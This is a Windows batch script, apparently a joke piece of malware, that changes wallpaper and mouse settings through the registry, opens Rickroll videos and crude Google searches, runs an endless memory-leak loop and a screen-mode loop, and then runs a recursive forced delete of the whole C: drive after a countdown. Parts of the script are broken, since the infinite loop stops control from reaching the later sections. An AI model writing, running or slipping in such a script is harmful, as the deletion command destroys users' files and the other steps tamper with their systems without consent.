@echo off
title Project Roaring Lions
echo Heavy caution, READ.
echo THIS IS UNFINISHED AND DESTRUCTIVE. I AM NOT RESPONSIBLE IF YOU GET FUCKED BY THIS.
REM WARNING: This batch file is unfinished and may cause unintended consequences.
REM Use it at your own risk. Proceed with caution.

REM Setting the desktop background on Windows 7
reg add "HKCU\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Green_and_Black%27s_dark_chocolate_bar_2.jpg/280px-Green_and_Black%27s_dark_chocolate_bar_2.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

REM Adding 5 rickrolls
for /L %%i in (1,1,5) do (
    start "Rickroll" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
)

REM Opening Chrome with keywords
start chrome "https://www.google.com/search?q=free+facebook+hacking+tools+2023"
start chrome "https://www.google.com/search?q=pubg+mobile+mod+apk"
start chrome "https://www.google.com/search?q=free+feces"
start chrome "https://www.google.com/search?q=how+can+i+shit+bricks"
start chrome "https://www.google.com/search?q=encyclopedia+dramatica"
start chrome "https://www.google.com/search?q=funny+cat+memes"
start chrome "https://www.google.com/search?q=unfortunate+stock+photos"
start chrome "https://www.google.com/search?q=weird+food+combinations"
start chrome "https://www.google.com/search?q=awkward+family+photos"
start chrome "https://www.google.com/search?q=world's+largest+toilet"

REM Setting a fast cursor
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "20" /f

REM Memory leaks
:leak
set "leak=!leak! "
goto leak

REM Resolution Fucker
:resolution
for /L %%i in (1,1,9999) do (
    mode %%i
    timeout 1 > nul
)

REM Destructive actions
:destructive
echo You're doomed! Your files will be destroyed in...

for /L %%i in (5,-1,1) do (
    echo %%i
    timeout 1 > nul
)

echo Deleting files...
del /f /s /q C:\*.*
echo Done!

